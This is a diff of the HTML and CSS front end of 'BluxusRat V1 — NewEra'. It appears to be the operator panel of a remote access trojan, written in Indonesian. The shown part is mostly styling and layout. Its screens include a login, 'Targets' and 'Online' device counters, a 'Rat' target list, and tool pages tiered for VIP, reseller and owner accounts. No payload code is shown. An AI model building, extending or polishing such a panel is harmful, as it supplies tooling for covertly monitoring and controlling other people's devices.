+.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#ffc107,#ff9800);border-radius:3px;transition:width .3s ease}
+.stat-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+.stat-box{background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:12px 8px;text-align:center}
+.stat-box .l{font-size:9px;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;justify-content:center;gap:4px}
+.stat-box .v{font-family:'Poppins',sans-serif;font-size:18px;font-weight:700}
+.stat-box.success{border-color:rgba(46,213,115,0.3)}
+.stat-box.success .l{color:var(--success)}
+.stat-box.success .v{color:var(--success)}
+.stat-box.fail{border-color:rgba(255,51,51,0.3)}
+.stat-box.fail .l{color:var(--error)}
+.stat-box.fail .v{color:var(--error)}
+.stat-box.total .l{color:var(--text-dim)}
+.stat-box.total .v{color:var(--text)}
+.console-box{background:#050304;border:1px solid var(--border);border-radius:14px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.7;max-height:280px;overflow-y:auto;box-shadow:inset 0 2px 8px rgba(0,0,0,0.6)}
+.console-line{display:flex;align-items:flex-start;gap:8px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
+.console-ts{color:var(--text-mute);flex-shrink:0;font-size:10px}
+.console-badge{padding:1px 7px;border-radius:5px;font-size:9px;font-weight:700;flex-shrink:0;min-width:48px;text-align:center}
+.console-badge.sent{background:rgba(46,213,115,0.15);color:#2ed573}
+.console-badge.fail{background:rgba(255,51,51,0.15);color:#ff3333}
+.console-msg{color:var(--text);flex:1;word-break:break-word}
+.spotify-list{display:flex;flex-direction:column;gap:10px;margin-top:14px}
+.spotify-item{display:flex;align-items:center;gap:12px;padding:10px;background:var(--bg-app);border:1px solid var(--border);border-radius:12px;cursor:pointer}
+.spotify-item .sp-cover{width:56px;height:56px;border-radius:10px;object-fit:cover;flex-shrink:0;background:var(--bg-card)}
+.spotify-item .sp-info{flex:1;min-width:0}
+.spotify-item .sp-info .t{font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.spotify-item .sp-info .a{font-size:11px;color:var(--text-dim);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.spotify-item .sp-info .d{font-size:10px;color:var(--text-mute);margin-top:3px;font-family:'JetBrains Mono',monospace}
+.spotify-item .sp-play{width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#1db954,#1aa34a);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.spotify-item .sp-play i{font-size:14px;color:#fff}
+.player-bar{position:fixed;bottom:6px;left:6px;right:6px;z-index:150;background:var(--bg-elev);border:1px solid var(--border);border-radius:18px;padding:12px 14px;box-shadow:0 8px 32px rgba(0,0,0,0.7);transform:translateY(120%);transition:transform .3s cubic-bezier(0.4,0,0.2,1);display:flex;align-items:center;gap:12px}
+.player-bar.show{transform:translateY(0)}
+.player-bar .pb-cover{width:46px;height:46px;border-radius:10px;object-fit:cover;flex-shrink:0}
+.player-bar .pb-info{flex:1;min-width:0}
+.player-bar .pb-info .t{font-size:12px;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.player-bar .pb-info .a{font-size:10px;color:var(--text-dim);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.player-bar .pb-info .progress-mini{width:100%;height:3px;background:var(--bg-card);border-radius:2px;margin-top:6px;overflow:hidden}
+.player-bar .pb-info .progress-mini .fill{height:100%;width:0%;background:#1db954;border-radius:2px;transition:width .2s linear}
+.player-bar .pb-controls{display:flex;gap:8px;align-items:center}
+.player-bar .pb-btn{width:38px;height:38px;border-radius:50%;background:var(--bg-card);border:1px solid var(--border);display:flex;align-items:center;justify-content:center}
+.player-bar .pb-btn.play{background:linear-gradient(135deg,#1db954,#1aa34a);border:none}
+.player-bar .pb-btn i{font-size:13px;color:var(--text)}
+.player-bar .pb-btn.play i{color:#fff}
+.player-bar .pb-close{width:32px;height:32px;border-radius:50%;background:var(--bg-card);border:1px solid var(--border);display:flex;align-items:center;justify-content:center}
+.player-bar .pb-close i{font-size:12px;color:var(--text-dim)}
+.gempa-card{background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;margin-top:14px}
+.gempa-mag{text-align:center;padding:24px;background:linear-gradient(135deg, rgba(46,213,115,0.1), transparent);border-bottom:1px solid var(--border)}
+.gempa-mag.warn{background:linear-gradient(135deg, rgba(255,165,2,0.15), transparent)}
+.gempa-mag.danger{background:linear-gradient(135deg, rgba(255,152,0,0.15), transparent)}
+.gempa-mag.critical{background:linear-gradient(135deg, rgba(255,51,51,0.2), transparent)}
+.gempa-mag .m-value{font-family:'Poppins',sans-serif;font-size:44px;font-weight:800;letter-spacing:-2px;line-height:1;color:var(--success)}
+.gempa-mag.warn .m-value{color:var(--warning)}
+.gempa-mag.danger .m-value{color:#ff9800}
+.gempa-mag.critical .m-value{color:var(--error)}
+.gempa-mag .m-label{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:2px;font-weight:700;margin-top:6px}
+.gempa-detail{padding:18px}
+.gempa-row{display:flex;gap:12px;padding:10px 0;border-bottom:1px solid var(--border)}
+.gempa-row:last-child{border-bottom:none}
+.gempa-row .icon{width:32px;height:32px;border-radius:9px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.gempa-row .icon i{font-size:13px;color:var(--accent-hover)}
+.gempa-row .info{flex:1;min-width:0}
+.gempa-row .info .l{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-bottom:3px}
+.gempa-row .info .v{font-size:13px;color:var(--text);font-weight:600;line-height:1.5}
+.gempa-shakemap{padding:0 18px 18px}
+.gempa-shakemap img{width:100%;border-radius:12px;display:block;border:1px solid var(--border);cursor:pointer}
+.gempa-shakemap .lbl{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px}
+.qr-result{text-align:center;padding:20px;background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius);margin-top:14px}
+.qr-result img{width:200px;height:200px;background:#fff;padding:10px;border-radius:12px;display:block;margin:0 auto 12px}
+.qr-url{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-dim);word-break:break-all;padding:8px 12px;background:var(--bg-card);border-radius:8px;margin-bottom:12px}
+.ngl-preview{background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius);padding:16px;margin-top:14px;text-align:center}
+.ngl-preview .lbl{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px}
+.ngl-preview .val{font-family:'Poppins',sans-serif;font-size:15px;font-weight:700;color:var(--text);margin-bottom:6px}
+.ngl-preview .to{font-size:12px;color:var(--text-dim)}
+.ngl-preview .to b{color:var(--accent-hover)}
+.upload-zone{border:2px dashed var(--border-hi);border-radius:var(--radius-lg);padding:36px 24px;text-align:center;cursor:pointer;background:var(--bg-card);position:relative}
 .upload-zone .uz-icon{width:72px;height:72px;border-radius:50%;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
 .upload-zone .uz-icon i{font-size:30px;color:var(--accent-hover)}
-.upload-zone .uz-title{font-family:'Poppins',sans-serif;font-size:16px;font-weight:700;color:var(--text);margin-bottom:6px}
-.upload-zone .uz-desc{font-size:12px;color:var(--text-dim);line-height:1.6}
+.upload-zone .uz-title{font-family:'Poppins',sans-serif;font-size:15px;font-weight:700;color:var(--text);margin-bottom:6px}
+.upload-zone .uz-desc{font-size:11px;color:var(--text-dim);line-height:1.6}
 .upload-zone input[type="file"]{position:absolute;inset:0;opacity:0;cursor:pointer}
 .upload-progress{margin-top:16px;display:none}
 .upload-progress.show{display:block}
-.upload-progress .up-bar{width:100%;height:8px;background:var(--bg-app);border-radius:4px;overflow:hidden;box-shadow:var(--shadow-inner)}
-.upload-progress .up-fill{height:100%;width:0%;background:linear-gradient(90deg,#8b0000,#c41e28,#ff4757);border-radius:4px;transition:width .2s ease;box-shadow:0 0 8px var(--accent-glow)}
+.upload-progress .up-bar{width:100%;height:8px;background:var(--bg-app);border-radius:4px;overflow:hidden}
+.upload-progress .up-fill{height:100%;width:0%;background:linear-gradient(90deg,#8b0000,#c41e28,#ff4757);border-radius:4px;transition:width .2s ease}
 .upload-progress .up-text{font-size:11px;color:var(--text-dim);margin-top:8px;text-align:center}
-.upload-result{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px;margin-top:16px;box-shadow:var(--shadow-card);display:none}
-.upload-result.show{display:block;animation:slideUp .3s ease}
-@keyframes slideUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.upload-result{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px;margin-top:16px;display:none}
+.upload-result.show{display:block}
 .upload-result .ur-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;padding-bottom:14px;border-bottom:1px solid var(--border)}
 .upload-result .ur-head .ico-badge{width:36px;height:36px;border-radius:10px;background:var(--success-soft);display:flex;align-items:center;justify-content:center}
 .upload-result .ur-head .ico-badge i{font-size:15px;color:var(--success)}
@@ -208,55 +324,29 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 .upload-result .ur-row .v{color:var(--text);font-weight:600;font-family:'JetBrains Mono',monospace;font-size:11px;word-break:break-all;text-align:right;flex:1}
 .upload-result .ur-actions{display:flex;gap:8px;margin-top:14px}
 .upload-result .ur-actions .btn{flex:1;font-size:11px;padding:10px}
-/* SIDEBAR */
-#sidebar{position:fixed;top:0;left:0;bottom:0;width:280px;max-width:82vw;background:var(--bg-app);border-right:1px solid var(--border);z-index:200;transform:translateX(-100%);transition:transform .3s cubic-bezier(0.4,0,0.2,1);display:flex;flex-direction:column;overflow-y:auto;box-shadow:20px 0 60px rgba(0,0,0,0.6)}
-#sidebar.open{transform:translateX(0)}
-#sidebar-backdrop{position:fixed;inset:0;background:rgba(5,3,4,.75);backdrop-filter:blur(4px);z-index:199;opacity:0;visibility:hidden;transition:var(--trans)}
-#sidebar-backdrop.show{opacity:1;visibility:visible}
-.sb-head{padding:28px 22px 20px;border-bottom:1px solid var(--border)}
-.sb-head .brand{font-family:'Poppins',sans-serif;font-size:20px;font-weight:800;letter-spacing:-1px;background:linear-gradient(135deg,#fff 40%, var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
-.sb-head .sub{font-size:10px;color:var(--text-dim);margin-top:4px;letter-spacing:2px;text-transform:uppercase}
-.sb-nav{padding:14px 12px;display:flex;flex-direction:column;gap:4px}
-.sb-item{padding:13px 14px;border-radius:12px;display:flex;align-items:center;gap:14px;font-size:14px;font-weight:600;color:var(--text-dim);transition:var(--trans);cursor:pointer;position:relative}
-.sb-item:hover{background:var(--bg-card);color:var(--text)}
-.sb-item.active{background:var(--accent-soft);color:var(--accent-hover)}
-.sb-item.active::before{content:'';position:absolute;left:0;top:20%;bottom:20%;width:3px;background:var(--accent);border-radius:3px}
-.sb-item .ico-badge{width:32px;height:32px;border-radius:9px;background:rgba(255,255,255,0.03);display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.sb-item.active .ico-badge{background:var(--accent-soft)}
-.sb-item .ico-badge i{font-size:14px;color:currentColor}
-.sb-sep{height:1px;background:var(--border);margin:10px 16px}
-.sb-label{font-size:10px;color:var(--text-mute);text-transform:uppercase;letter-spacing:2px;padding:12px 16px 6px;font-weight:700}
-/* SECTION */
-.section{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:20px;box-shadow:var(--shadow-card)}
-.section h3{font-family:'Poppins',sans-serif;font-size:14px;font-weight:700;margin-bottom:16px;letter-spacing:.3px;display:flex;align-items:center;gap:12px}
-.section h3 .ico-badge{width:32px;height:32px;border-radius:9px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center}
-.section h3 .ico-badge i{font-size:13px;color:var(--accent-hover)}
-/* PANEL GRID */
 .panel-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.panel-action{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:18px 14px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:10px;cursor:pointer;transition:var(--trans);box-shadow:var(--shadow-card)}
-.panel-action:hover{border-color:var(--accent);transform:translateY(-2px)}
+.panel-action{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:18px 14px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:10px;cursor:pointer;box-shadow:var(--shadow-card)}
 .panel-action .ico-badge{width:48px;height:48px;border-radius:14px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center}
 .panel-action .ico-badge i{font-size:20px;color:var(--accent-hover)}
 .panel-action .txt{font-size:12px;font-weight:700;color:var(--text);font-family:'Poppins',sans-serif;line-height:1.3}
-/* STAT GRID */
 .stat-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-.stat-card{background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-sm);padding:14px;box-shadow:var(--shadow-inner)}
+.stat-card{background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-sm);padding:14px}
 .stat-card .l{font-size:9px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.2px;font-weight:700;margin-bottom:6px}
-.stat-card .v{font-family:'Poppins',sans-serif;font-size:22px;font-weight:700;color:var(--text);letter-spacing:-.5px}
+.stat-card .v{font-family:'Poppins',sans-serif;font-size:22px;font-weight:700;color:var(--text)}
 .stat-card .v.accent{color:var(--accent-hover)}
 .stat-card .v.success{color:var(--success)}
 .stat-card .v.warn{color:var(--warning)}
 .stat-card .v.info{color:var(--info)}
-/* ACCOUNT */
 .profile-head{display:flex;flex-direction:column;align-items:center;gap:12px;padding:26px 0}
 .avatar-wrap{position:relative}
 .avatar{width:100px;height:100px;border-radius:50%;object-fit:cover;border:3px solid var(--accent);background:var(--bg-elev);box-shadow:0 0 0 6px var(--bg-app)}
-.avatar-wrap .edit{position:absolute;right:2px;bottom:2px;width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#c41e28,#8b0000);display:flex;align-items:center;justify-content:center;border:3px solid var(--bg-app);cursor:pointer;box-shadow:0 4px 12px var(--accent-glow)}
+.avatar-wrap .edit{position:absolute;right:2px;bottom:2px;width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#c41e28,#8b0000);display:flex;align-items:center;justify-content:center;border:3px solid var(--bg-app);cursor:pointer}
 .avatar-wrap .edit i{font-size:12px;color:#fff}
 .profile-head .uname{font-family:'Poppins',sans-serif;font-size:22px;font-weight:700;color:#fff}
-.profile-head .urole{font-size:10px;padding:5px 16px;border-radius:20px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;text-transform:uppercase;letter-spacing:2px;font-weight:700;box-shadow:0 4px 12px var(--accent-glow)}
-.list-item{display:flex;align-items:center;gap:14px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;transition:var(--trans);margin-bottom:10px;box-shadow:var(--shadow-card)}
-.list-item:hover{border-color:var(--accent);background:var(--bg-elev)}
+.profile-head .urole{font-size:10px;padding:5px 16px;border-radius:20px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;text-transform:uppercase;letter-spacing:2px;font-weight:700}
+.profile-head .urole.vip{background:linear-gradient(135deg,#ffc107,#ff9800);color:#1a1000}
+.profile-head .urole.reseller{background:linear-gradient(135deg,#2ed573,#1a9e4f)}
+.list-item{display:flex;align-items:center;gap:14px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;margin-bottom:10px;box-shadow:var(--shadow-card)}
 .list-item .ico-badge{width:40px;height:40px;border-radius:11px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .list-item .ico-badge i{font-size:15px;color:var(--accent-hover)}
 .list-item .txt{flex:1}
@@ -266,12 +356,10 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 .list-item.danger .ico-badge{background:var(--error-soft)}
 .list-item.danger .ico-badge i{color:var(--error)}
 .list-item.danger .txt .n{color:var(--error)}
-/* ABOUT */
 .about-hero{text-align:center;padding:30px 20px 20px}
 .about-hero .ab-logo{font-family:'Poppins',sans-serif;font-size:36px;font-weight:800;letter-spacing:-1.5px;background:linear-gradient(135deg,#fff 40%, var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
 .about-hero .ab-ver{font-size:11px;color:var(--accent);letter-spacing:4px;text-transform:uppercase;font-weight:700}
 .about-hero .ab-desc{font-size:12px;color:var(--text-dim);margin-top:12px;line-height:1.7}
-/* MODAL */
 .modal{position:fixed;inset:0;z-index:500;background:rgba(5,3,4,.85);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;visibility:hidden;transition:var(--trans)}
 .modal.show{opacity:1;visibility:visible}
 .modal-box{width:100%;max-width:480px;background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px;transform:scale(.95) translateY(10px);transition:transform .25s ease;max-height:92vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,0.7)}
@@ -280,15 +368,10 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 .modal-box .sub{font-size:12px;color:var(--text-dim);margin-bottom:18px;line-height:1.6;text-align:center}
 .modal-actions{display:flex;gap:8px;margin-top:20px}
 .modal-actions .btn{flex:1}
-.modal-box input[type="text"],.modal-box input[type="password"],.modal-box input[type="number"],.modal-box input[type="tel"],.modal-box select,.modal-box textarea{
-  width:100%;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);padding:13px 14px;font-size:13px;font-weight:600;transition:var(--trans);box-shadow:var(--shadow-inner);-webkit-appearance:none;appearance:none;
-}
-.modal-box input:focus,.modal-box select:focus,.modal-box textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
-.modal-box select{background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23a39599' stroke-width='3'><polyline points='6 9 12 15 18 9'/></svg>");background-repeat:no-repeat;background-position:right 16px center;padding-right:40px}
+.modal-box input,.modal-box select,.modal-box textarea{width:100%;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);padding:13px 14px;font-size:13px;font-weight:600;box-shadow:var(--shadow-inner);-webkit-appearance:none}
 .modal-box textarea{resize:vertical;min-height:80px;font-family:inherit;font-weight:500;line-height:1.5}
-/* TOAST */
 #toast-wrap{position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:900;display:flex;flex-direction:column;gap:8px;pointer-events:none;width:calc(100% - 32px);max-width:380px}
-.toast{padding:14px 16px;background:var(--bg-elev);border:1px solid var(--border);border-radius:14px;font-size:12px;font-weight:600;color:var(--text);box-shadow:0 12px 32px rgba(0,0,0,0.6);animation:toastIn .3s cubic-bezier(0.4,0,0.2,1);pointer-events:auto;display:flex;align-items:center;gap:12px}
+.toast{padding:14px 16px;background:var(--bg-elev);border:1px solid var(--border);border-radius:14px;font-size:12px;font-weight:600;color:var(--text);box-shadow:0 12px 32px rgba(0,0,0,0.6);animation:toastIn .3s;pointer-events:auto;display:flex;align-items:center;gap:12px}
 .toast .ico-badge{width:28px;height:28px;border-radius:8px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .toast .ico-badge i{font-size:12px;color:var(--accent-hover)}
 .toast.ok .ico-badge{background:var(--success-soft)}
@@ -328,14 +411,8 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
       <div class="form-zone">
         <div class="card">
           <div class="card-title">Sign In</div>
-          <div class="field">
-            <label>Username</label>
-            <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input type="text" id="login-usn" placeholder="username"></div>
-          </div>
-          <div class="field">
-            <label>Password</label>
-            <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="login-pw" placeholder="••••••••"></div>
-          </div>
+          <div class="field"><label>Username</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input type="text" id="login-usn" placeholder="username"></div></div>
+          <div class="field"><label>Password</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="password" id="login-pw" placeholder="••••••••"></div></div>
           <button class="btn btn-primary" id="btn-login"><i class="fa-solid fa-right-to-bracket"></i> Login</button>
           <div class="login-meta">BluxusRat V1 — NewEra</div>
         </div>
@@ -358,7 +435,6 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
             <div class="s">Control panel siap</div>
           </div>
         </div>
-
         <div class="user-card">
           <div class="content">
             <div class="left">
@@ -366,91 +442,49 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
               <div class="usn" id="dash-usn">—</div>
               <div class="role" id="dash-role"><i class="fa-solid fa-user"></i> member</div>
             </div>
-            <div class="right">
-              <div class="label">User Code</div>
-              <div class="val mono" id="dash-usercode">—</div>
-            </div>
+            <div class="right"><div class="label">User Code</div><div class="val mono" id="dash-usercode">—</div></div>
           </div>
         </div>
-
         <div class="mini-grid">
-          <div class="mini-card">
-            <div class="ico-badge"><i class="fa-solid fa-crosshairs"></i></div>
-            <div class="info"><div class="label">Targets</div><div class="val" id="dash-targets">0</div></div>
-          </div>
-          <div class="mini-card">
-            <div class="ico-badge"><i class="fa-solid fa-wifi"></i></div>
-            <div class="info"><div class="label">Online</div><div class="val" id="dash-online">0</div></div>
-          </div>
+          <div class="mini-card"><div class="ico-badge"><i class="fa-solid fa-crosshairs"></i></div><div class="info"><div class="label">Targets</div><div class="val" id="dash-targets">0</div></div></div>
+          <div class="mini-card"><div class="ico-badge"><i class="fa-solid fa-wifi"></i></div><div class="info"><div class="label">Online</div><div class="val" id="dash-online">0</div></div></div>
         </div>
-
         <div id="announce-wrap"></div>
       </div>
     </div>
 
     <!-- RAT -->
     <div class="screen" id="screen-rat">
-      <div class="dash-header">
-        <div class="hamburger" id="btn-hamburger-rat"><i class="fa-solid fa-bars"></i></div>
-        <span class="page-title">Rat</span>
-        <div style="width:40px"></div>
-      </div>
+      <div class="dash-header"><div class="hamburger" id="btn-hamburger-rat"><i class="fa-solid fa-bars"></i></div><span class="page-title">Rat</span><div style="width:40px"></div></div>
       <div class="dash-body">
         <div class="section">
           <h3><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Target List</h3>
-          <div class="target-list" id="target-list">
-            <div style="font-size:12px;color:var(--text-mute);text-align:center;padding:20px">Belum ada target</div>
-          </div>
+          <div class="target-list" id="target-list"><div style="font-size:12px;color:var(--text-mute);text-align:center;padding:20px">Belum ada target</div></div>
         </div>
       </div>
     </div>
 
     <!-- TOOLS -->
     <div class="screen" id="screen-tools">
-      <div class="dash-header">
-        <div class="hamburger" id="btn-hamburger-tools"><i class="fa-solid fa-bars"></i></div>
-        <span class="page-title">Tools</span>
-        <div style="width:40px"></div>
-      </div>
+      <div class="dash-header"><div class="hamburger" id="btn-hamburger-tools"><i class="fa-solid fa-bars"></i></div><span class="page-title">Tools</span><div style="width:40px"></div></div>
       <div class="dash-body">
         <div class="section">
-          <h3><div class="ico-badge"><i class="fa-solid fa-link"></i></div> To Link</h3>
-          <div style="font-size:12px;color:var(--text-dim);line-height:1.6;margin-bottom:14px">Upload foto atau video, dapet URL-nya.</div>
-          <div class="upload-zone" id="upload-zone">
-            <input type="file" id="upload-input" accept="image/*,video/*">
-            <div class="uz-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
-            <div class="uz-title">Tap untuk pilih file</div>
-            <div class="uz-desc">atau drag & drop di sini<br>Max 2 MB</div>
+          <h3><div class="ico-badge"><i class="fa-solid fa-toolbox"></i></div> Regular Tools</h3>
+          <div class="tools-grid" id="tools-grid"></div>
+        </div>
+        <div class="vip-section">
+          <div class="vip-header">
+            <div class="vh-icon"><i class="fa-solid fa-crown"></i></div>
+            <div class="vh-text"><div class="n">VIP Tools</div><div class="d">Khusus VIP, Reseller & Owner</div></div>
           </div>
-          <div class="upload-progress" id="upload-progress">
-            <div class="up-bar"><div class="up-fill" id="up-fill"></div></div>
-            <div class="up-text" id="up-text">Mengunggah... 0%</div>
-          </div>
-          <div class="upload-result" id="upload-result">
-            <div class="ur-head">
-              <div class="ico-badge"><i class="fa-solid fa-circle-check"></i></div>
-              <div class="t">Upload Berhasil</div>
-            </div>
-            <div class="ur-row"><span class="l">URL</span><span class="v" id="ur-url">—</span></div>
-            <div class="ur-row"><span class="l">Size</span><span class="v" id="ur-size">—</span></div>
-            <div class="ur-row"><span class="l">Created</span><span class="v" id="ur-created">—</span></div>
-            <div class="ur-row"><span class="l">API by</span><span class="v" id="ur-api">Termai</span></div>
-            <div class="ur-actions">
-              <button class="btn btn-ghost" id="btn-copy-url"><i class="fa-solid fa-copy"></i> Copy</button>
-              <button class="btn btn-primary" id="btn-open-url"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka</button>
-            </div>
-          </div>
+          <div class="tools-grid" id="vip-tools-grid"></div>
         </div>
       </div>
     </div>
 
     <!-- ACCOUNT -->
     <div class="screen" id="screen-account">
-      <div class="dash-header">
-        <div class="hamburger" id="btn-hamburger-account"><i class="fa-solid fa-bars"></i></div>
-        <span class="page-title">Account</span>
-        <div style="width:40px"></div>
-      </div>
+      <div class="dash-header"><div class="hamburger" id="btn-hamburger-account"><i class="fa-solid fa-bars"></i></div><span class="page-title">Account</span><div style="width:40px"></div></div>
       <div class="dash-body">
         <div class="profile-head">
           <div class="avatar-wrap">
@@ -461,41 +495,23 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
           <div class="urole" id="acc-role">member</div>
         </div>
         <div class="section">
-          <div style="display:flex;justify-content:space-between;font-size:13px;padding:8px 0">
-            <span style="color:var(--text-dim)"><i class="fa-solid fa-key" style="color:var(--accent-hover)"></i> User Code</span>
-            <span id="acc-usercode" style="font-weight:700;font-family:'JetBrains Mono',monospace;font-size:11px">—</span>
-          </div>
+          <div style="display:flex;justify-content:space-between;font-size:13px;padding:8px 0"><span style="color:var(--text-dim)"><i class="fa-solid fa-key" style="color:var(--accent-hover)"></i> User Code</span><span id="acc-usercode" style="font-weight:700;font-family:'JetBrains Mono',monospace;font-size:11px">—</span></div>
           <div style="height:1px;background:var(--border);margin:4px 0"></div>
-          <div style="display:flex;justify-content:space-between;font-size:13px;padding:8px 0">
-            <span style="color:var(--text-dim)"><i class="fa-solid fa-calendar" style="color:var(--accent-hover)"></i> Created</span>
-            <span id="acc-created" style="font-weight:700">—</span>
-          </div>
+          <div style="display:flex;justify-content:space-between;font-size:13px;padding:8px 0"><span style="color:var(--text-dim)"><i class="fa-solid fa-calendar" style="color:var(--accent-hover)"></i> Created</span><span id="acc-created" style="font-weight:700">—</span></div>
         </div>
-        <div class="list-item" id="btn-settings">
-          <div class="ico-badge"><i class="fa-solid fa-gear"></i></div>
-          <div class="txt"><div class="n">Settings</div><div class="d">Ganti password</div></div>
-          <div class="arrow"><i class="fa-solid fa-chevron-right"></i></div>
-        </div>
-        <div class="list-item danger" id="btn-logout">
-          <div class="ico-badge"><i class="fa-solid fa-right-from-bracket"></i></div>
-          <div class="txt"><div class="n">Log Out</div><div class="d">Keluar akun</div></div>
-          <div class="arrow"><i class="fa-solid fa-chevron-right"></i></div>
-        </div>
+        <div class="list-item" id="btn-settings"><div class="ico-badge"><i class="fa-solid fa-gear"></i></div><div class="txt"><div class="n">Settings</div><div class="d">Ganti password</div></div><div class="arrow"><i class="fa-solid fa-chevron-right"></i></div></div>
+        <div class="list-item danger" id="btn-logout"><div class="ico-badge"><i class="fa-solid fa-right-from-bracket"></i></div><div class="txt"><div class="n">Log Out</div><div class="d">Keluar akun</div></div><div class="arrow"><i class="fa-solid fa-chevron-right"></i></div></div>
       </div>
     </div>
 
     <!-- ABOUT -->
     <div class="screen" id="screen-about">
-      <div class="dash-header">
-        <div class="hamburger" id="btn-hamburger-about"><i class="fa-solid fa-bars"></i></div>
-        <span class="page-title">About</span>
-        <div style="width:40px"></div>
-      </div>
+      <div class="dash-header"><div class="hamburger" id="btn-hamburger-about"><i class="fa-solid fa-bars"></i></div><span class="page-title">About</span><div style="width:40px"></div></div>
       <div class="dash-body">
         <div class="about-hero">
           <div class="ab-logo">BluxusRat</div>
           <div class="ab-ver">V1 [NewEra]</div>
-          <div class="ab-desc">Control panel untuk monitoring & control device.<br>Firebase-powered.</div>
+          <div class="ab-desc">Control panel untuk monitoring & control device.</div>
         </div>
         <div class="section">
           <h3><div class="ico-badge"><i class="fa-solid fa-code"></i></div> Developer</h3>
@@ -507,42 +523,21 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
         </div>
         <div class="section">
           <h3><div class="ico-badge"><i class="fa-solid fa-users"></i></div> Community</h3>
-          <div class="list-item" onclick="window.open('https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w','_blank')">
-            <div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div>
-            <div class="txt"><div class="n">Channel WhatsApp</div><div class="d">Info & update</div></div>
-            <div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div>
-          </div>
